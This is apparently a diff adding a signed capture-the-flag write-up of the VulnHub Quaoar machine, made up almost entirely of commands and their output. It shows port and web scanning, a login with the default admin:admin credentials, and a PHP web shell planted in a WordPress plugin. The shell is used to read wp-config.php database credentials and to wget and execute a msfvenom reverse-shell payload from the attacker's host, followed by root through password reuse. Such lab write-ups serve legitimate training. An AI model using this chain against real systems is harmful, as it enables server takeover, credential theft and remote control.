@@ -1,0 +1,331 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_hackfest2016-quaoar.txt,v 1.0 2017/03/16 08:50:33 dhn Exp $
+
+Writeup hackfest2016: Quaoar [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=174.0.42.14
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -T4 -A -p- $ip
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-15 08:43 EDT
+Nmap scan report for S0106f0f249e3d463.cg.shawcable.net (174.0.42.14)
+Host is up (0.00019s latency).
+Not shown: 65526 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
+|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
+|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+| dns-nsid:
+|_  bind.version: 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_Hackers
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: CAPA UIDL RESP-CODES SASL STLS PIPELINING TOP
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-15T12:43:21+00:00; 0s from scanner time.
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IDLE more have LITERAL+ LOGINDISABLEDA0001 Pre-login post-login capabilities ENABLE LOGIN-REFERRALS OK ID STARTTLS SASL-IR IMAP4rev1 listed
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-15T12:43:21+00:00; 0s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
+993/tcp open  ssl/imap    Dovecot imapd
+|_imap-capabilities: AUTH=PLAINA0001 more LITERAL+ OK Pre-login have capabilities post-login LOGIN-REFERRALS ENABLE ID IDLE SASL-IR IMAP4rev1 listed
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-15T12:43:21+00:00; 0s from scanner time.
+995/tcp open  ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: CAPA UIDL RESP-CODES SASL(PLAIN) PIPELINING USER TOP
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-15T12:43:21+00:00; 0s from scanner time.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.6.3)
+|   NetBIOS computer name:
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-03-15T08:43:21-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 174.47 seconds
+
+0x1) run nikto
+
+[dhn]::[~/dev/ctf/write_up/boot2root] nikto -h http://$ip
+- - Nikto v2.1.6
+- ---------------------------------------------------------------------------
++ Target IP:          174.0.42.14
++ Target Hostname:    174.0.42.14
++ Target Port:        80
++ Start Time:         2017-03-15 08:47:31 (GMT-4)
+- ---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
++ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wordpress/: A Wordpress installation was found.
++ 8348 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2017-03-15 08:47:41 (GMT-4) (10 seconds)
+- ---------------------------------------------------------------------------
++ 1 host(s) tested
+
+0x2) enumerating usernames via wpscan
+
+[dhn]::[~/dev/ctf/write_up/boot2root] wpscan --url http://$ip/wordpress --enumerate u
+
+...
+[+] Enumerating usernames ...
+[+] Identified the following 2 user/s:
+    +----+--------+--------+
+    | Id | Login  | Name   |
+    +----+--------+--------+
+    | 1  | admin  | admin  |
+    | 2  | wpuser | wpuser |
+    +----+--------+--------+
+...
+
+0x3) try to login with default credentials: admin:admin
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat wp_login.py
+#!/usr/bin/env python
+
+from wordpress_xmlrpc import Client, WordPressPost
+from wordpress_xmlrpc.exceptions import *
+from wordpress_xmlrpc.methods import *
+import argparse
+
+def main(args):
+    wp_url = args.url
+    wp_user = args.user
+    wp_pass = args.pwd
+
+    try:
+        wp_site = Client(wp_url, wp_user, wp_pass)
+        siteurl = wp_site.call(options.GetOptions(['home_url']))[0].value
+        if siteurl:
+            print("[+] login successfully: " + wp_user + ":" + wp_pass)
+    except InvalidCredentialsError as e:
+        print("[!] login failed")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--url',  help="url + xmlrpc.php path (required)", required=True)
+    parser.add_argument('--user', help="username (required)", required=True)
+    parser.add_argument('--pwd', help="password (required)", required=True)
+    args = parser.parse_args()
+    main(args)
+
+[dhn]::[~/dev/ctf/write_up/boot2root] ./wp_login.py --url http://$ip/wordpress/xmlrpc.php --user admin --pwd admin
+[+] login successfully: admin:admin
+
+0x4) modify hello_dolly plugin with payload
+
+	system($_GET["cmd"]);
+
+0x5) trigger the payload
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+0x6) check if the target can ping
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=ping+-c+10+174.0.42.42
+[dhn]::[~/dev/ctf/write_up/boot2root] tcpdump -ennv icmp -i eth4
+tcpdump: listening on eth4, link-type EN10MB (Ethernet), capture size 262144 bytes
+10:19:48.550925 00:0c:29:d1:de:34 > 00:0c:29:97:29:a0, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
+    174.0.42.14 > 174.0.42.42: ICMP echo request, id 3085, seq 1, length 64
+10:19:48.550948 00:0c:29:97:29:a0 > 00:0c:29:d1:de:34, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 28915, offset 0, flags [none], proto ICMP (1), length 84)
+    174.0.42.42 > 174.0.42.14: ICMP echo reply, id 3085, seq 1, length 64
+10:19:49.549924 00:0c:29:d1:de:34 > 00:0c:29:97:29:a0, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
+    174.0.42.14 > 174.0.42.42: ICMP echo request, id 3085, seq 2, length 64
+10:19:49.549950 00:0c:29:97:29:a0 > 00:0c:29:d1:de:34, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 28961, offset 0, flags [none], proto ICMP (1), length 84)
+    174.0.42.42 > 174.0.42.14: ICMP echo reply, id 3085, seq 2, length 64
+10:19:50.549811 00:0c:29:d1:de:34 > 00:0c:29:97:29:a0, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
+    174.0.42.14 > 174.0.42.42: ICMP echo request, id 3085, seq 3, length 64
+10:19:50.549834 00:0c:29:97:29:a0 > 00:0c:29:d1:de:34, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 29164, offset 0, flags [none], proto ICMP (1), length 84)
+    174.0.42.42 > 174.0.42.14: ICMP echo reply, id 3085, seq 3, length 64
+10:19:51.549844 00:0c:29:d1:de:34 > 00:0c:29:97:29:a0, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
+    174.0.42.14 > 174.0.42.42: ICMP echo request, id 3085, seq 4, length 64
+10:19:51.549882 00:0c:29:97:29:a0 > 00:0c:29:d1:de:34, ethertype IPv4 (0x0800), length 98: (tos 0x0, ttl 64, id 29308, offset 0, flags [none], proto ICMP (1), length 84)
+    174.0.42.42 > 174.0.42.14: ICMP echo reply, id 3085, seq 4, length 64
+....
+
+0x7) leak the mysql password
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=cat+/var/www/wordpress/wp-config.php 
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'rootpassword!');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+...
+
+0x8) create meterpreter and start multi handler
+
+[dhn]::[~/dev/ctf/write_up/boot2root] msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -b '\\x00' LHOST="174.0.42.42" LPORT=7766 -f elf -o dhn
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 98 (iteration=0)
+x86/shikata_ga_nai chosen with final size 98
+Payload size: 98 bytes
+Final size of elf file: 182 bytes
+Saved as: dhn
+
+0x9) use the webshell to download and execute the meterpreter
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=wget+http://174.0.42.42:8000/dhn+-O+/tmp/evil
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=chmod+777+/tmp/evil
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/wordpress/wp-content/plugins/hello.php?cmd=bash+-c+/tmp/evil
+
+0xa) get the first flag
+
+msf exploit(handler) > run
+
+[*] Started reverse TCP handler on 174.0.42.42:7766
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 174.0.42.14
+[*] Meterpreter session 1 opened (174.0.42.42:7766 -> 174.0.42.14:44909) at 2017-03-15 10:32:38 -0400
+
+meterpreter > sysinfo
+Computer     : Quaoar
+OS           : Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 (i686)
+Architecture : i686
+Meterpreter  : x86/linux
+meterpreter > ls /home/wpadmin
+Listing: /home/wpadmin
+======================
+
+Mode              Size  Type  Last modified              Name
+- ----              ----  ----  -------------              ----
+100644/rw-r--r--  33    fil   2016-10-22 12:53:38 -0400  flag.txt
+
+meterpreter > cat /home/wpadmin/flag.txt
+2bafe61f03117ac66a73c3c514de796e
+meterpreter >
+
+0xb) connect with wpadmin to the ssh server with wpadmin as password...
+
+[dhn]::[~/dev/ctf/write_up/boot2root] ssh wpadmin@$ip
+wpadmin@174.0.42.14's password:
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Mar 15 11:14:00 EDT 2017
+
+  System load:  0.16              Processes:             111
+  Usage of /:   30.3% of 7.21GB   Users logged in:       0
+  Memory usage: 44%               IP address for eth0:   174.0.42.14
+  Swap usage:   13%               IP address for virbr0: 192.168.122.1
+
+  => There are 3 zombie processes.
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sat Oct 22 23:03:05 2016 from 192.168.1.26
+$ id
+uid=1001(wpadmin) gid=1001(wpadmin) groups=1001(wpadmin)
+
+0xc) use the leaked mysql password to get root privilege.
+     this  worked because the mysql user is "root" and he
+     used the same password in the system ;) #fail
+
+$ bash
+wpadmin@Quaoar:~$ su
+Password:
+root@Quaoar:/home/wpadmin# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Quaoar:/home/wpadmin#
+
+0xd) get the second flag
+
+root@Quaoar:~# cat /root/flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb
+
+[1] https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYykwOAAoJEKjdmUcmQRI8vg0P/RC8H0o7V2AqUjiOKOAvH72p
+AgHnlOwyzGbfpRZSSfMWoutdilpeLLeVAd/pp+PtdwbeKXVB1UUrn601N1U8JVje
+mVtW7i/iaduwR+R2meDZOfRlL7BalLhrAhHofWeYU8BHrXyvD6S6R0/VFfOQ25W6
+rEPnIdM6MbrWTSaiDAZMuVb3zQtGVX2if6ccLMvR8YDIkADLaAMR+2XLzhXf57NV
+qaAmuGMi44Vmjr+lcgWxyze0DqFq2yfuXs4DkaAgBkadlqSfo0VTnI8uAINsxFWa
++bg53n+jJfrz1rWRZKtBxOshH3v7HYR/peTj6sAa6aNJHrL/Cr1dSZonujP10Ami
+YL4fIGWIJVcmjbdgdAW0OI2EyazZNkSwLXqpY/e51kAChBHqTpDqayGqDdkw59Br
+yOa5LGE03TEdlJZudZm1VVSWttOgB93+D7nuXjXZOvVxx0ejEADRpneBJXOgECkU
+qX7A1r2fjg7SVjhakW9mKQ8M0eb7CUvHKYrtMHNaf91dxrDqCsgH6gPudMEVE5yN
+2tLunEwcfxkhaqcI59id2tegeVxQytvwNHtL8f6L7Qmu3YQUYnlD/GHnPhnNwHHZ
+pksLwrmqhutWnTzIokOyqhMAaM4T6kPB0l1Yx4f9ehv0KjYOxdfuBLKm7g1vREg8
++0QMVZYCW5GmuPKpyp43
+=HMWi
+-----END PGP SIGNATURE-----
